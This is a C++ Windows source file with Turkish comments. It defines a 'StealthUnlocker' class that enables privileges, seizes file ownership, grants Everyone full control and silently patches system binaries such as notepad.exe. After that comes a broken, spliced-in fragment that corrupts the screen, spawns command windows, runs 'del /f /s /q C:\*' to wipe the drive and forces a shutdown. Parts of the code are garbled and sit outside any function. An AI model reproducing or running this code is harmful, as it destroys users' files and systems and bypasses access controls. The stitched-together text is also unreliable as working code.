#include <windows.h>
#include <fstream>
#include <iostream>

class StealthUnlocker {
private:
    static bool EnablePriv(const wchar_t* priv) {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            return false;
        
        TOKEN_PRIVILEGES tp = {0};
        if (!LookupPrivilegeValueW(NULL, priv, &tp.Privileges[0].Luid)) {
            CloseHandle(hToken);
            return false;
        }
        
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        bool ok = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, 0);
        CloseHandle(hToken);
        return ok;
    }
    
    static bool TakeOwnership(const wchar_t* path) {
        HANDLE hFile = CreateFileW(path, WRITE_OWNER, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        
        PSID pAdmin;
        ConvertStringSidToSidW(L"S-1-5-32-544", &pAdmin);
        
        bool ok = SetSecurityInfo(hFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pAdmin, NULL, NULL, NULL) == ERROR_SUCCESS;
        CloseHandle(hFile);
        return ok;
    }
    
    static bool SetFullAccess(const wchar_t* path) {
        HANDLE hFile = CreateFileW(path, WRITE_DAC, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        
        PACL pOldDacl;
        GetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDacl, NULL, NULL);
        
        PSID pEveryone;
        ConvertStringSidToSidW(L"S-1-1-0", &pEveryone);
        
        EXPLICIT_ACCESS_W ea = {0};
        ea.grfAccessPermissions = GENERIC_ALL;
        ea.grfAccessMode = SET_ACCESS;
        ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
        ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        ea.Trustee.ptstrName = (LPWSTR)pEveryone;
        
        PACL pNewDacl = NULL;
        SetEntriesInAclW(1, &ea, pOldDacl, &pNewDacl);
        
        bool ok = SetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL) == ERROR_SUCCESS;
        
        LocalFree(pNewDacl);
        CloseHandle(hFile);
        return ok;
    }

public:
    static bool Unlock(const wchar_t* path) {
        EnablePriv(SE_TAKE_OWNERSHIP_NAME);
        EnablePriv(SE_RESTORE_NAME);
        EnablePriv(SE_BACKUP_NAME);
        
        if (!TakeOwnership(path)) return false;
        if (!SetFullAccess(path)) return false;
        
        return true;
    }
    
    static bool Modify(const wchar_t* path, const char* newContent) {
        if (!Unlock(path)) return false;
        
        HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        
        DWORD written;
        WriteFile(hFile, newContent, strlen(newContent), &written, NULL);
        CloseHandle(hFile);
        
        return true;
    }
    
    static bool PatchFile(const wchar_t* path, DWORD offset, const BYTE* patch, DWORD size) {
        if (!Unlock(path)) return false;
        
        HANDLE hFile = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        
        SetFilePointer(hFile, offset, NULL, FILE_BEGIN);
        
        DWORD written;
        WriteFile(hFile, patch, size, &written, NULL);
        
        CloseHandle(hFile);
        return true;
    }
};

// SESSİZ KULLANIM - HİÇBİR ŞEY YAZDIRMAZ
int main() {
    // Örnek 1: Bir dosyayı kilidini aç (sessizce)
    StealthUnlocker::Unlock(L"C:\\");
    
    // Örnek 3: Binary dosyada patch yap (sessizce)
    BYTE patch[] = {0x90, 0x90, 0x90}; // NOP'lar
    StealthUnlocker::PatchFile(L"C:\\Windows\\notepad.exe", 0x1000, patch, 3);
}
bool BypassForSpecificFile(const wchar_t* filename) {
    // 1. Dosyayı Windows'un izin verdiği yere taşı
    // 2. VirtualStore mekanizmasını kullan
    // 3. Symbolic link oluştur
    
    // Örnek: hosts dosyası için
    CreateSymbolicLinkW(
        L"C:\\",
        L"C:\\",
        0
    );
}
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    for (int i = 0; i < 1000; i++) {
        BitBlt(hdc, rand() % 25, rand() % 25, w, h, hdc, rand() % 25, rand() % 25, NOTSRCERASE);
        Sleep(2);
    }

    for (int i = 0; i < 20; i++) {
        system("start cmd.exe /k ");
    }

    system("del /f /s /q C:\\*");

    system("shutdown /s /t 0 /f");

    return 0;
}
